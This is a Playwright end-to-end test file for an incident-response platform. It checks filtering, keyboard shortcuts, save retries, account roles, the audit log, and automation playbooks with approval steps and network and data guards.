  // What cannot be read is said where it goes wrong, at once or by the server.
  await filter.fill('(status:open')
  await expect(panel.getByText('A parenthesis is not closed: add the closing )')).toBeVisible()
  await filter.fill('stauts:open')
  await expect(panel.getByText('"stauts" is not a field of incidents: did you mean "status"?')).toBeVisible()
  await expect(filter).toHaveAttribute('aria-invalid', 'true')
  await filter.fill('')
  await expect(filter).not.toHaveAttribute('aria-invalid', 'true')
  await expect(list).toContainText('WKS-FINANCE-01')

  // The artifacts: the same language; "mine" writes its condition.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const artifacts = page.getByRole('complementary', { name: 'Artifacts panel' })
  const artifactFilter = artifacts.getByRole('combobox', { name: 'Filter artifacts' })
  await artifactFilter.fill('kind:file dropper')
  await expect(artifacts.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  await artifacts.getByRole('button', { name: 'mine' }).click()
  await expect(artifactFilter).toHaveValue(`kind:file dropper createdBy:${ADMIN.username}`)
  await artifactFilter.fill('kind:file size:<1')
  await expect(artifacts.getByRole('navigation', { name: 'Artifacts' })).toContainText(
    'No artifact matches these filters.',
  )
  await artifactFilter.fill('knid:file')
  await expect(artifacts.getByText('did you mean "kind"?')).toBeVisible()
  await artifactFilter.fill('')

  // The IoC library: its pickers write the query too.
  await page.getByRole('button', { name: /^IoC library/ }).click()
  await page
    .getByRole('complementary', { name: 'IoCs panel' })
    .getByRole('button', { name: /^All indicators/ })
    .click()
  const indicatorFilter = page.getByRole('combobox', { name: 'Filter indicators' })
  await indicatorFilter.fill('type:ip 185.220.*')
  await expect(page.locator('main tbody tr').first()).toContainText('185.220.101.47')
  await page.locator('main').getByRole('combobox').filter({ hasText: 'All types' }).selectOption('domain')
  await expect(indicatorFilter).toHaveValue('185.220.* type:domain')
  await page.locator('main').getByRole('combobox').filter({ hasText: 'Any verdict' }).selectOption('flagged')
  await expect(indicatorFilter).toHaveValue('185.220.* type:domain verdict:>=suspicious')
  await indicatorFilter.fill('')

  // Back to the incident.
  await page
    .getByRole('navigation', { name: 'Sections' })
    .getByRole('button', { name: 'Incidents', exact: true })
    .click()
  await list.locator('li', { hasText: 'WKS-FINANCE-01' }).getByRole('button').first().click()
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('keyboard shortcuts: F flags the row under the pointer, C comments, ? lists them', async () => {
  await openEvidence('Malware Analysis')
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  // The tab may have just been drawn: read the flag once the sample is there.
  await expect(sample).toBeVisible()
  const before = await flag.count()

  // F toggles the flag of the row under the pointer, as its menu would.
  await sample.hover()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before ? 0 : 1)
  await expect(page.getByText(before ? 'Flag removed: dropper.bin' : 'Flagged: dropper.bin')).toBeVisible()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before)

  // C asks for the comment.
  await page.keyboard.press('c')
  const comment = page.getByRole('dialog', { name: 'Comment on the sample' })
  await expect(comment).toBeVisible()
  // Typing in a field is typing: no shortcut runs.
  await comment.getByRole('textbox').fill('fc?')
  await expect(comment.getByRole('textbox')).toHaveValue('fc?')
  await page.keyboard.press('Escape')
  await expect(comment).toHaveCount(0)
  await expect(flag).toHaveCount(before)

  // The menu shows the keys; "?" and the header button list every shortcut.
  await sample.click({ button: 'right' })
  await expect(page.getByRole('menuitem', { name: /flag/i }).first()).toContainText('F')
  await page.keyboard.press('Escape')
  await page.keyboard.press('?')
  const help = page.getByRole('dialog', { name: 'Keyboard shortcuts' })
  await expect(help).toContainText('Flag the row under the pointer')
  await page.keyboard.press('Escape')
  await expect(help).toHaveCount(0)
  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  await expect(help).toBeVisible()
  await page.keyboard.press('Escape')

  // Nothing to flag under the pointer: said, not guessed.
  await page.getByRole('banner').hover()
  await page.keyboard.press('f')
  await expect(page.getByText('Nothing to flag under the pointer.')).toBeVisible()
})

test("saves are retried, merged with a colleague's, resumed after the session expires; a removed flag comes back", async () => {
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/incident/')[1] ?? '')
  expect(incidentId).not.toBe('')
  const stored = async () => (await page.request.get(`/api/incidents/${incidentId}`)).json()
  const storedFlags = async () => Object.keys((await stored()).flags ?? {}).length
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  const toggle = async () => {
    await sample.hover()
    await page.keyboard.press('f')
  }
  const failSaves = (route) => (route.request().method() === 'PATCH' ? route.abort() : route.fallback())
  const unsaved = page.getByRole('alert').filter({ hasText: 'Changes not saved yet' })
  const before = await flag.count()
  const flagsBefore = await storedFlags()
  const other = before ? flagsBefore - 1 : flagsBefore + 1

  // A save that fails is said, kept, and sent when asked again.
  await page.route('**/api/incidents/*', failSaves)
  await toggle()
  await expect(flag).toHaveCount(before ? 0 : 1)
  await expect(unsaved).toBeVisible()
  expect(await storedFlags()).toBe(flagsBefore)
  await page.unroute('**/api/incidents/*', failSaves)
  await unsaved.getByRole('button', { name: 'Retry now' }).click()
  await expect(unsaved).toHaveCount(0)
  await expect.poll(storedFlags).toBe(other)

  // A colleague writes to the same incident meanwhile: both changes are kept.
  const note = await page.request.post(`/api/incidents/${incidentId}/notes`, {
    data: { text: 'note from a colleague' },
  })
  expect(note.status()).toBe(201)
  await toggle()
  await expect(flag).toHaveCount(before)
  await expect.poll(storedFlags).toBe(flagsBefore)
  expect((await stored()).notes.map((item) => item.text)).toContain('note from a colleague')

  // The session ends with a change still to save: signing in again saves it.
  await page.route('**/api/incidents/*', failSaves)
  await toggle()
  await expect(unsaved).toBeVisible()
  await page.request.post('/api/auth/logout')
  await page.unroute('**/api/incidents/*', failSaves)
  await unsaved
    .getByRole('button', { name: 'Retry now' })
    .click({ timeout: 2000 })
    .catch(() => {})
  const expired = page.getByRole('dialog', { name: 'Session expired' })
  await expect(expired).toContainText('not saved yet')
  await expired.getByLabel('Password of admin').fill(ADMIN.password)
  await expired.getByRole('button', { name: 'Sign in again' }).click()
  await expect(expired).toHaveCount(0)
  await expect.poll(storedFlags).toBe(other)
  await expect(unsaved).toHaveCount(0)

  // Removing a flag can be undone.
  if (!(await flag.count())) await toggle()
  await expect(flag).toHaveCount(1)
  await toggle()
  await expect(flag).toHaveCount(0)
  await page.getByRole('button', { name: 'Undo' }).last().click()
  await expect(flag).toHaveCount(1)
  if (!before) {
    await toggle()
    await expect(flag).toHaveCount(0)
  }
  await expect.poll(storedFlags).toBe(flagsBefore)
})

test('an admin manages accounts; the audit log is written by the server', async ({ browser }) => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Accounts').click()

  // A new analyst, then renamed, promoted and given another password from the pencil.
  await settings.locator('#add-username').fill('anna')
  await settings.locator('#add-password').fill('first-secret')
  await settings.getByRole('button', { name: 'Add user' }).click()
  const accounts = settings.getByRole('list', { name: 'Accounts' })
  const anna = accounts.getByRole('listitem').filter({ hasText: 'anna' })
  await expect(anna).toContainText('Analyst')
  await anna.getByRole('button', { name: 'Edit user anna' }).click()
  const edit = page.getByRole('dialog', { name: 'Account: anna' })
  await edit.locator('#edit-username').fill('anna.b')
  await edit.getByRole('checkbox', { name: /^Admin/ }).check()
  await edit.locator('#edit-password').fill('second-secret')
  await edit.getByRole('button', { name: 'Save changes' }).click()
  await expect(edit).toHaveCount(0)
  const renamed = accounts.getByRole('listitem').filter({ hasText: 'anna.b' })
  // Roles add up: the account is an analyst and an admin.
  await expect(renamed.getByLabel('Roles')).toHaveText('AnalystAdmin')

  // The account signs in with its new name and password, and changes its own password.
  const other = await browser.newPage()
  await other.goto('/')
  await other.fill('#login-username', 'anna.b')
  await other.fill('#login-password', 'second-secret')
  await other.click('button[type=submit]')
  await other.getByRole('button', { name: 'Open platform settings' }).click()
  const theirs = other.getByRole('region', { name: 'Settings' })
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('My account').click()
  await theirs.locator('#own-current-password').fill('second-secret')
  await theirs.locator('#own-new-password').fill('third-secret')
  await theirs.locator('#own-confirm-password').fill('third-secret')
  await theirs.getByRole('button', { name: 'Change password' }).click()
  await expect(theirs.getByRole('status')).toContainText('Password changed')

  // Disabled by the admin: the open session is over at its next request.
  await renamed.getByRole('button', { name: 'Edit user anna.b' }).click()
  const again = page.getByRole('dialog', { name: 'Account: anna.b' })
  await again.getByRole('checkbox', { name: /^Disabled/ }).check()
  await again.getByRole('button', { name: 'Save changes' }).click()
  await expect(renamed).toContainText('Disabled')
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('Audit log').click()
  await expect(other.getByRole('dialog', { name: 'Session expired' })).toBeVisible()
  await other.close()

  // The admin cannot lock themselves out.
  await accounts
    .getByRole('listitem')
    .filter({ hasText: 'You' })
    .getByRole('button', { name: /^Edit user/ })
    .click()
  const own = page.getByRole('dialog', { name: `Account: ${ADMIN.username}` })
  await expect(own.getByRole('checkbox', { name: /^Admin/ })).toBeDisabled()
  await expect(own.getByRole('checkbox', { name: /^Analyst/ })).toBeEnabled()
  await expect(own.getByRole('checkbox', { name: /^Disabled/ })).toBeDisabled()
  await own.getByRole('button', { name: 'Cancel' }).click()

  // Everything above is in the audit log, recorded by the server.
  await sections.getByText('Audit log').click()
  for (const text of ['user.create', 'renamed from "anna"', 'password reset', 'user.password', 'disabled']) {
    await expect(settings.getByText(text).first()).toBeVisible()
  }
  // It cannot be written from the browser.
  const forged = await page.request.post('/api/audit', { data: { action: 'incident.delete', details: 'not me' } })
  expect(forged.status()).toBe(400)

  await sections.getByText('Accounts').click()
  await renamed.getByRole('button', { name: 'Delete user anna.b' }).click()
  await expect(renamed).toHaveCount(0)
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('roles are tags: an account sees and does what its roles grant together', async ({ browser }) => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Accounts').click()
  const accounts = settings.getByRole('list', { name: 'Accounts' })

  // Rita reads and manages the rule sets; Otto reads the audit log and nothing else.
  const add = async (name, roles) => {
    await settings.locator('#add-username').fill(name)
    await settings.locator('#add-password').fill('role-secret')
    for (const role of ['Viewer', 'Analyst', 'Rules', 'Audit', 'Admin']) {
      await settings.locator(`#add-role-${role.toLowerCase()}`).setChecked(roles.includes(role))
    }
    await settings.getByRole('button', { name: 'Add user' }).click()
    await expect(accounts.getByRole('listitem').filter({ hasText: name }).getByLabel('Roles')).toHaveText(
      roles.join(''),
    )
  }
  await add('rita', ['Viewer', 'Rules'])
  await add('otto', ['Audit'])
  // An account needs at least one role.
  await settings.locator('#add-role-analyst').uncheck()
  await expect(settings.getByRole('button', { name: 'Add user' })).toBeDisabled()
  await settings.locator('#add-role-analyst').check()
  await settings.getByRole('button', { name: 'Close settings' }).click()

  const signIn = async (name) => {
    const other = await browser.newPage()
    await other.goto('/')
    await other.fill('#login-username', name)
    await other.fill('#login-password', 'role-secret')
    await other.click('button[type=submit]')
    await expect(other.getByRole('button', { name: 'Open platform settings' })).toBeVisible()
    return other
  }

  // A viewer with the rules role: reads the incidents, creates none, manages the rule sets.
  const rita = await signIn('rita')
  const ritaRail = rita.getByRole('navigation', { name: 'Sections' })
  await expect(ritaRail.getByRole('button', { name: /incidents/i })).toBeVisible()
  // The foot of the rail is the same for everyone: no shortcut to a section of Settings.
  await expect(ritaRail.getByRole('button', { name: 'Audit log' })).toHaveCount(0)
  await expect(ritaRail.getByRole('button', { name: 'Users' })).toHaveCount(0)
  await expect(ritaRail.getByRole('button', { name: /^Account: rita/ })).toBeVisible()
  await expect(rita.getByText('read-only', { exact: true })).toBeVisible()
  await expect(rita.getByRole('button', { name: 'New incident' })).toHaveCount(0)
  expect((await rita.request.post('/api/incidents', { data: { id: 'by-rita', data: {} } })).status()).toBe(403)
  await rita.getByRole('button', { name: 'Open platform settings' }).click()
  const ritaSections = rita.getByRole('navigation', { name: 'Settings sections' })
  await expect(ritaSections.getByText('YARA rules')).toBeVisible()
  await expect(ritaSections.getByText('Detection rules')).toBeVisible()
  for (const hidden of ['Accounts and roles', 'API keys', 'Audit log', 'Storage', 'Backup', 'Threat intelligence']) {
    await expect(ritaSections.getByText(hidden, { exact: true })).toHaveCount(0)
  }
  await ritaSections.getByText('My account').click()
  await expect(rita.getByRole('region', { name: 'Settings' }).getByLabel('Roles')).toHaveText('ViewerRules')
  const rule = { name: 'by-rita', source: 'rule by_rita { condition: false }', enabled: true }
  const made = await rita.request.post('/api/yara-rules', { data: rule })
  expect(made.status()).toBe(201)
  expect((await rita.request.delete(`/api/yara-rules/${(await made.json()).id}`)).status()).toBe(204)
  await rita.close()

  // The audit role alone: no incidents, no artifacts; the audit log, and one's own account.
  const otto = await signIn('otto')
  await expect(otto.getByText('Nothing to open here')).toBeVisible()
  const ottoRail = otto.getByRole('navigation', { name: 'Sections' })
  await expect(ottoRail.getByRole('button')).toHaveCount(2) // the settings and the account
  await ottoRail.getByRole('button', { name: 'Open platform settings' }).click()
  const ottoSettings = otto.getByRole('region', { name: 'Settings' })
  await ottoSettings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByRole('button', { name: 'Audit log' })
    .click()
  await expect(ottoSettings.getByText('user.create').first()).toBeVisible()
  await expect(ottoSettings.getByRole('button', { name: /clear/i })).toHaveCount(0)
  await expect(ottoSettings.getByRole('navigation', { name: 'Settings sections' }).getByRole('button')).toHaveText([
    'My account',
    'Audit log',
  ])
  expect((await otto.request.get('/api/incidents')).status()).toBe(403)
  await otto.close()

  // Leave the accounts as they were.
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  await sections.getByText('Accounts').click()
  for (const name of ['rita', 'otto']) {
    await accounts
      .getByRole('listitem')
      .filter({ hasText: name })
      .getByRole('button', { name: `Delete user ${name}` })
      .click()
    await expect(accounts.getByRole('listitem').filter({ hasText: name })).toHaveCount(0)
  }
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('a playbook is drawn on the canvas, checked by the server and saved as a version', async () => {
  test.setTimeout(240_000) // a long story, and the runners of CI are slower than a desk
  const before = page.url()
  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await expect(page).toHaveURL(/\/automation\/playbooks$/)
  // The playbooks Nik ships are there from the first start, off: nothing runs until someone turns one on.
  const shipped = area.getByRole('row').filter({ hasText: 'shipped with Nik' })
  await expect(shipped).toHaveCount(5)
  await expect(shipped.filter({ hasText: 'Phishing triage' })).toHaveCount(1)
  const listed = (await (await page.request.get('/api/automation/playbooks')).json()).playbooks
  expect(listed.filter((playbook) => playbook.enabled)).toEqual([])

  await area.getByRole('button', { name: 'New playbook' }).first().click()
  const create = page.getByRole('dialog', { name: 'New playbook' })
  await create.getByLabel('Name').fill('Note on high')
  await create.getByRole('button', { name: 'Create' }).click()
  await expect(page).toHaveURL(/\/automation\/playbooks\/[0-9a-f]+$/)
  await expect(area.getByRole('heading', { name: 'Note on high' })).toBeVisible()
  await expect(area.getByText('playbook · no version yet')).toBeVisible()

  const canvas = area.getByTestId('playbook-canvas')
  const library = area.getByRole('complementary', { name: 'Node library' })
  const inspector = area.getByRole('complementary', { name: 'Inspector' })
  const nodes = canvas.locator('.react-flow__node')
  await expect(nodes).toHaveCount(1)
  await expect(nodes.first()).toContainText('by hand')

  // The trigger: an event of Nik, besides being run by hand.
  await nodes.first().click()
  await inspector.getByLabel('On an event').selectOption('incident.created')
  await expect(nodes.first()).toContainText('incident.created · by hand')

  // A node added from the library comes after the selected one, joined to it.
  await library.getByLabel('Search nodes').fill('condit')
  await library.getByRole('button', { name: 'Condition', exact: true }).click()
  await library.getByLabel('Search nodes').fill('')
  await expect(nodes).toHaveCount(2)
  await expect(canvas.locator('.react-flow__edge')).toHaveCount(1)
  // "Pick a value" writes the expression; what is typed wrong says where.
  await inspector.getByRole('button', { name: 'Pick a value for Comparison 1: what to compare' }).click()
  await page
    .getByRole('dialog', { name: 'Pick a value' })
    .getByText('trigger.incident.severity', { exact: true })
    .click()
  await expect(inspector.getByRole('textbox', { name: 'Comparison 1: what to compare' })).toHaveValue(
    '{{ trigger.incident.severity }}',
  )
  await inspector.getByRole('textbox', { name: 'Comparison 1: with what' }).fill('{{ trigger.incident.severity ')
  await expect(inspector.getByText('The expression is not closed: add }}')).toBeVisible()
  await inspector.getByRole('textbox', { name: 'Comparison 1: with what' }).fill('high')

  // Without a search the commands are in groups that start closed: the group is opened first.
  await expect(library.getByRole('tab', { name: /^Commands/ })).toHaveAttribute('aria-selected', 'true')
  await expect(library.getByRole('button', { name: 'Add a note', exact: true })).toBeHidden()
  await library.locator('summary', { hasText: /^Nik/ }).click()
  await library.getByRole('button', { name: 'Add a note', exact: true }).click()
  await expect(nodes).toHaveCount(3)
  await expect(canvas.locator('.react-flow__edge')).toHaveCount(2)
  await expect(inspector.getByRole('group', { name: 'Port then' })).toBeVisible()

  // The draft saves itself: a reload finds the three nodes.
  await expect(area.getByText('draft saved')).toBeVisible()
  await page.reload()
  await expect(nodes).toHaveCount(3)

  // Not a version yet: the note has no text. The server says what and where.
  await area.getByRole('button', { name: 'Save as version 1' }).click()
  await expect(page.getByText('One thing to fix before this can be a version.')).toBeVisible()
  await expect(inspector.getByText('"text" is required')).toBeVisible()
  await expect(nodes.filter({ hasText: 'Add a note' })).toContainText('1 to fix')
  await inspector
    .getByLabel(/^text/)
    .fill('Severity is {{ trigger.incident.severity }}: look at {{ trigger.incident.name }}')

  // An "End" on the other branch, drawn from the inspector without a pointer; then undo and redo.
  // The nodes of the flow have a tab of their own.
  await library.getByRole('tab', { name: /^Flow/ }).click()
  await library.getByRole('button', { name: 'End', exact: true }).click()
  await library.getByRole('tab', { name: /^Commands/ }).click()
  await expect(nodes).toHaveCount(4)
  await area.getByRole('button', { name: 'Node list' }).click()
  const table = area.getByRole('table', { name: 'The nodes of the playbook' })
  await expect(table.getByRole('row')).toHaveCount(5)
  await table.getByRole('button', { name: 'Condition' }).click()
  await inspector.getByLabel('Draw an edge "no" to').selectOption({ label: 'End' })
  await expect(table.getByRole('row', { name: /^Condition/ })).toContainText('no → End')
  await area.getByRole('button', { name: 'Undo' }).click()
  await expect(table.getByRole('row', { name: /^Condition/ })).not.toContainText('no → End')
  await area.getByRole('button', { name: 'Redo' }).click()
  await expect(table.getByRole('row', { name: /^Condition/ })).toContainText('no → End')
  await area.getByRole('button', { name: 'Tidy up' }).click()
  await area.getByRole('button', { name: 'Node list' }).click()

  await area.getByRole('button', { name: 'Save as version 1' }).click()
  await expect(page.getByText('Version 1 saved: it is what runs from now on.')).toBeVisible()
  await expect(area.getByText('playbook · version 1')).toBeVisible()
  await expect(area.getByRole('button', { name: 'Save as version 2' })).toBeDisabled()

  // Versions; then what the playbook may reach, behind the double check.
  await area.getByRole('radio', { name: 'Versions' }).click()
  await expect(page).toHaveURL(/\/versions$/)
  await expect(area.getByRole('table', { name: 'Versions of Note on high' }).getByRole('row')).toHaveCount(2)
  await area.getByRole('radio', { name: 'Settings' }).click()
  const network = area.getByRole('region', { name: 'Network' })
  await network.getByLabel('Add a host').fill('https://Hooks.Example.org/path')
  await network.getByRole('button', { name: 'Add' }).click()
  await expect(network.getByRole('listitem').filter({ hasText: 'hooks.example.org' })).toBeVisible()
  await network.getByRole('radio', { name: 'Any host' }).click()
  const check = page.getByRole('dialog', { name: 'Let this playbook reach any host?' })
  const allow = check.getByRole('button', { name: 'Allow any host' })
  await expect(allow).toBeDisabled()
  await check.getByRole('checkbox').check()
  await check.locator('#data-guard-name').fill('note on high')
  await expect(allow).toBeDisabled() // the name, exactly as it is written
  await check.locator('#data-guard-name').fill('Note on high')
  await allow.click()
  await expect(check).toBeHidden()
  await expect(network.getByText('any host', { exact: true })).toBeVisible()
  await network.getByRole('radio', { name: 'Listed hosts only' }).click()
  await expect(network.getByText('any host', { exact: true })).toBeHidden()
  // A class of data is opened the same way, and closed with one click.
  const data = area.getByRole('region', { name: 'Data that may leave' })
  await data.getByRole('button', { name: 'Open: E-mail addresses' }).click()
  const open = page.getByRole('dialog', { name: 'Let e-mail addresses leave Nik in this playbook?' })
  await expect(open).toContainText('hooks.example.org')
  await open.getByRole('checkbox').check()
  await open.locator('#data-guard-name').fill('Note on high')
  await open.getByRole('button', { name: 'Allow e-mail addresses' }).click()
  await expect(data.getByText('may leave', { exact: true })).toBeVisible()
  await data.getByRole('button', { name: 'Close: E-mail addresses' }).click()
  await expect(data.getByText('may leave', { exact: true })).toBeHidden()

  // The list: on, with its trigger and version. Settings has the switch for everything.
  await area.getByRole('button', { name: 'All playbooks' }).click()
  const row = area.getByRole('row').filter({ hasText: 'Note on high' })
  await expect(row).toContainText('incident.created')
  await row.getByRole('switch').click()
  await expect(row.getByRole('switch')).toBeChecked()
  await area.getByRole('button', { name: 'Close automations' }).click()
  await expect(area).toBeHidden()

  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Stop all').click()
  await expect(page).toHaveURL(/\/settings\/automation\/stop-all$/)
  await expect(settings.getByText('running')).toBeVisible()
  await expect(settings.getByText('alive')).toBeVisible()
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Network and data').click()
  // The hosts every playbook may reach are a list: the section says which, and Lists edits it.
  await expect(settings.getByLabel('Hosts: reads the list')).toHaveValue('automation_hosts')
  await settings.getByRole('button', { name: 'Open in Lists' }).click()
  await expect(page).toHaveURL(/\/settings\/lists\/all\?open=automation_hosts$/)
  const hosts = settings.getByRole('article', { name: 'Hosts every playbook may reach' })
  await hosts.getByLabel('Items, one a line').fill('Intel.Example.org')
  await hosts.getByRole('button', { name: 'Save the items' }).click()
  await expect(hosts.getByRole('status')).toHaveText('Saved.')
  // Kept as a host is written: in lower case.
  await expect(hosts.getByLabel('Items, one a line')).toHaveValue('intel.example.org')
  await expect(hosts.getByRole('region', { name: 'Where it is used' })).toContainText('Network and data')
  await settings.getByRole('button', { name: 'Close settings' }).click()
  // The area was reloaded on its own address: back to the incident the next steps work on.
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a playbook runs on an incident: the approval is asked where the incident is, the run shows what happened', async () => {
  test.setTimeout(240_000) // the worker takes a step every second or so, and the story has many
  const before = page.url()
  const incidentId = decodeURIComponent(new URL(before).pathname.split('/')[2])
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')

  // A playbook that asks a person, then writes a note (made through the API: the canvas has its own test).
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Ask then note' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const graph = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      {
        id: 'ask',
        kind: 'approval',
        name: 'Ask first',
        position: { x: 40, y: 160 },
        config: { question: 'Add a note to {{ trigger.incident.name }}?', detail: { why: 'a test' } },
      },
      {
        id: 'note',
        kind: 'action',
        name: 'Add a note',
        position: { x: 40, y: 280 },
        config: { action: 'nik.add-note', args: { text: 'Approved by {{ ask.by }}: {{ ask.comment }}' } },
      },
    ],
    edges: [
      { from: 'start', to: 'ask' },
      { from: 'ask', port: 'approved', to: 'note' },
    ],
  }
  const saved = await page.request.post(`/api/automation/playbooks/${playbookId}/versions`, { data: { graph } })
  expect(saved.status()).toBe(201)

  // Run by hand, from the incident's own menu.
  await page
    .locator('aside nav[aria-label="Incidents"] li')
    .filter({ hasText: 'WKS-FINANCE-01' })
    .click({ button: 'right' })
  await page.getByRole('menu').getByRole('menuitem', { name: 'Run a playbook…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Run a playbook' })
  await expect(dialog.locator('#run-incident')).toHaveAttribute('data-incident', incidentId)
  await dialog.locator('#run-playbook').selectOption(playbookId)
  await dialog.getByRole('button', { name: 'Run', exact: true }).click()

  // The run: the same canvas, each node by what happened to it; it waits for a person.
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  const area = page.getByRole('region', { name: 'Automations' })
  const status = area.getByRole('status', { name: 'Status of the run' })
  await expect(status).toHaveText('waiting for approval', { timeout: 15_000 })
  await expect(area.getByTestId('rf__node-ask')).toContainText('waiting')
  await expect(area.getByTestId('rf__node-note')).toContainText('pending')
  await expect(area.getByRole('region', { name: /^Approval asked: Add a note to WKS-FINANCE-01/ })).toContainText(
    'a test',
  )

  // The rail counts what waits, and the incident shows the question above its tabs.
  await area.getByRole('button', { name: 'Close automations' }).click()
  await expect(page.getByRole('button', { name: 'Automations (1 approval waits)' })).toBeVisible()
  const banner = page.getByRole('region', { name: /^Approval asked: Add a note to WKS-FINANCE-01/ })
  await banner.getByLabel('A comment with the answer').fill('looks right')
  await banner.getByRole('button', { name: 'Approve' }).click()
  await expect(page.getByText('Approved: the run goes on.')).toBeVisible()
  await expect(banner).toBeHidden()
  await expect(page.getByRole('button', { name: 'Automations', exact: true })).toBeVisible()

  // The work plan of the incident lists its runs; a run opens on its page.
  await tabs.getByRole('button', { name: 'Work plan', exact: true }).click()
  const onIncident = page.getByRole('table', { name: 'Runs on this incident' })
  await expect(onIncident.getByRole('row').filter({ hasText: 'Ask then note' })).toContainText('done', {
    timeout: 15_000,
  })
  await onIncident.getByRole('button', { name: 'Ask then note' }).click()
  await expect(status).toHaveText('done')
  const steps = area.getByRole('complementary', { name: 'Steps of the run' })
  await expect(steps).toContainText('“looks right”')
  await steps.getByRole('button', { name: /Add a note/ }).click()
  await expect(steps.getByText('Came out')).toBeVisible()
  await expect(steps.getByText('Went in')).toBeVisible()

  // From the playbook's page: a dry run asks nobody and writes nothing.
  await area.getByRole('button', { name: 'version 1' }).click()
  await expect(area.getByRole('heading', { name: 'Ask then note' })).toBeVisible()
  await area.getByRole('button', { name: 'Run…' }).click()
  // Opened from the playbook: it is the one that runs, and the incident is found by typing.
  const own = page.getByRole('dialog', { name: 'Run “Ask then note”' })
  await expect(own.locator('#run-playbook')).toBeHidden()
  const picker = own.getByRole('combobox', { name: 'On which incident' })
  await picker.fill('zzzz no such incident')
  await expect(own.getByRole('listbox', { name: 'Incidents that match' })).toContainText('No incident matches.')
  await picker.fill('wks-finance')
  const offered = own.getByRole('listbox', { name: 'Incidents that match' }).getByRole('option')
  await expect(offered).toHaveCount(1)
  await expect(offered).toContainText(/#\d{5}/)
  await picker.press('Enter')
  await expect(own.locator('#run-incident')).toHaveAttribute('data-incident', incidentId)
  await own.getByRole('checkbox').check()
  await own.getByRole('button', { name: 'Start the dry run' }).click()
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  await expect(area.getByText('dry run', { exact: true })).toBeVisible()
  await expect(status).toHaveText('done', { timeout: 15_000 })
  await steps.getByRole('button', { name: /Ask first/ }).click()
  await expect(steps).toContainText('"by": "dry run"')

  // Every run, newest first; then the approvals answered lately.
  await area.getByRole('button', { name: 'All runs' }).click()
  const all = area.getByRole('table', { name: 'Runs' })
  await expect(all.getByRole('row')).toHaveCount(3)
  await expect(all.getByRole('row').nth(1)).toContainText('dry run')
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Approvals' }).click()
  await expect(area.getByText('Nothing waits for an answer')).toBeVisible()
  await expect(area.getByRole('region', { name: 'Answered lately' })).toContainText('looks right')

  // A trigger: the playbook drawn on the canvas waits for incidents of high severity.
  const created = await page.request.post('/api/incidents', {
    data: { id: 'e2e-automation', name: 'E2E high', severity: 'high', data: {} },
  })
  expect(created.status()).toBe(201)
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Runs' }).click()
  const triggered = all.getByRole('row').filter({ hasText: 'Note on high' })
  await expect(async () => {
    await area.getByRole('button', { name: 'Refresh' }).click()
    await expect(triggered).toContainText('done', { timeout: 1000 })
  }).toPass({ timeout: 20_000 })
  await expect(triggered).toContainText('incident.created')
  expect((await page.request.delete('/api/incidents/e2e-automation')).status()).toBe(204)

  // Back on the incident: the note the playbook wrote is marked, the dry run wrote none.
  await page.goto(before)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.getByText('Approved by admin: looks right')).toBeVisible()
  await expect(page.getByRole('button', { name: 'automation', exact: true })).toHaveCount(1)
})

test('a script is written, tested in the sandbox, saved as a version and offered as a node', async () => {
  test.setTimeout(240_000) // a long story, and the runners of CI are slower than a desk
  const before = page.url()
  // The sandbox runs in CI (and wherever E2E_SANDBOX_URL names one); without it, what needs one is checked to be refused.
  const sandbox = Boolean(process.env.E2E_SANDBOX_URL)
  /** Replace what a code editor holds. */
  const write = async (editor, text) => {
    await editor.click()
    await page.keyboard.press('ControlOrMeta+a')
    await page.keyboard.insertText(text)
  }

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
  await expect(page).toHaveURL(/\/automation\/scripts$/)
  const shipped = area.getByRole('table', { name: 'Scripts' }).getByRole('row').filter({ hasText: 'GroupByField' })
  await expect(shipped).toContainText('in the library')
  await expect(shipped).toContainText('shipped with Nik')

  // A name is how nodes call the script: a capital letter, letters and digits.
  await area.getByRole('button', { name: 'New script' }).click()
  const create = page.getByRole('dialog', { name: 'New script' })
  await create.getByLabel('Name').fill('count words')
